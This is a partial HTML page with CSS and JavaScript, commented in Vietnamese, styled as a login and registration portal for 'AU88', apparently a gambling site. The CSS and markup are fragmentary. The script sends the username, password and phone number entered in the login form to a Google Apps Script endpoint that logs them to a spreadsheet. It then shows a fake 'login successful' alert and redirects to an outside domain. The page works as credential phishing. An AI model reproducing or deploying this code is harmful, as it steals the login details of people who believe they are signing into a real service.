        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; }
        
        /* HEADER VỚI LOGO VÀ NÚT */
        .header { background: #111; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
        .logo img { height: 50px; display: block; } /* Thêm display block để logo chuẩn hơn */
        .auth-buttons button { padding: 8px 15px; margin-left: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-login { background: #ff9800; color: white; }
        .btn-register { background: #ff0000; /* Đã đổi từ màu xám sang màu đỏ */ color: white; }

        /* BANNER QUẢNG CÁO */
        .banner { width: 100%; max-width: 1200px; margin: 10px auto; display: block; border-radius: 10px; }

        /* THANH MENU ĐẦY ĐỦ CÁC MỤC VỚI KÝ HIỆU */
        .game-menu { display: flex; overflow-x: auto; background: #222; padding: 15px 10px; gap: 15px; justify-content: center; border-bottom: 1px solid #333; }
        .menu-item { display: flex; flex-direction: column; align-items: center; min-width: 75px; font-size: 11px; cursor: pointer; color: #bbb; text-transform: uppercase; }
        .menu-item img { width: 25px; height: 25px; margin-bottom: 5px; }
        .menu-item:hover, .menu-item.active { color: #ff9800; }

        /* MODAL GIAO DIỆN CHUẨN */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; }
        .modal-content { background: white; width: 340px; margin: 80px auto; padding: 30px; border-radius: 12px; text-align: center; color: #333; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        .modal-content h2 { color: #ff9800; margin-bottom: 20px; font-size: 24px; }
        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        .btn-submit { width: 100%; padding: 14px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
   /* Đoạn code định dạng dòng chữ quảng cáo */
.promo-text {
    background-color: #1a1a1a; /* Màu nền đen xám giống ảnh */

    padding: 20px 10px;
    font-size: 24px; /* Kích thước chữ to */
    font-weight: bold;
    text-transform: uppercase; /* Viết hoa toàn bộ */

    border-top: 1px solid #333; /* Đường kẻ mờ phía trên */
    border-bottom: 1px solid #333; /* Đường kẻ mờ phía dưới */
    margin-top: 5px;
}

/* Chỉnh cho mobile chữ nhỏ lại một chút để không bị tràn dòng */
@media (max-width: 768px) {

        /* Đoạn code định dạng 4 Banner tròn mạ vàng */
.banner-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr); /* Chia thành 4 cột đều nhau */
    gap: 20px; /* Khoảng cách giữa các banner */
    padding: 30px 10%; /* Khoảng cách phía trên/dưới và 2 bên */
    background-color: #1a1a1a; /* Màu nền đen xám */
    justify-content: center;
}

.banner-item {

}

.banner-item img {

    box-shadow: 0 5px 15px rgba(255, 180, 0, 0.3); /* Đổ bóng màu vàng nhẹ */
}

/* Chỉnh cho mobile */

    .banner-grid {
        grid-template-columns: repeat(2, 1fr); /* Chuyển thành 2 cột */
        gap: 15px;
        padding: 20px 5%;
    }
}

    <div id="loginModal" class="modal">
        <div class="modal-content">

            <input type="text" id="login_user" placeholder="Tên tài khoản">

    <div id="registerModal" class="modal">
        <div class="modal-content">
            <h2>ĐĂNG KÝ</h2>
            <input type="text" id="phone" placeholder="Số điện thoại của bạn (Bắt buộc)">
            <button class="btn-submit" onclick="sendData()">ĐĂNG KÝ NGAY</button>

    <script>
        // LINK APP SCRIPT ĐÃ KẾT NỐI VỚI GOOGLE SHEETS CỦA BẠN
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec';

        function openModal(id) { document.getElementById(id).style.display = 'block'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        // GỬI DỮ LIỆU ĐĂNG KÝ (1 Ô SĐT)
        async function sendData() {
            const phone = document.getElementById('phone').value;
            if (!phone) { alert("Vui lòng nhập số điện thoại!"); return; }

            const formData = new URLSearchParams();
            formData.append('type', 'Đăng ký AU88'); // Nguồn hiển thị trên Sheets
            formData.append('phone', phone);

            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
            alert("Đăng ký thành công!");
            window.location.href = "https://b12.bongvippro.xyz";
        }

        // GỬI DỮ LIỆU ĐĂNG NHẬP (3 Ô THÔNG TIN)
        async function sendLoginData() {
            const user = document.getElementById('login_user').value;
            const pass = document.getElementById('login_pass').value;
            const phone = document.getElementById('login_phone').value;

            if (!user || !pass || !phone) { alert("Vui lòng nhập đầy đủ thông tin!"); return; }

            const formData = new URLSearchParams();
            formData.append('type', 'Đăng nhập AU88');
            formData.append('username', user);
            formData.append('password', pass);
            formData.append('phone', phone);

            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: formData });
            alert("Đăng nhập thành công!");
            window.location.href = "https://b12.bongvippro.xyz";
        }
    </script>
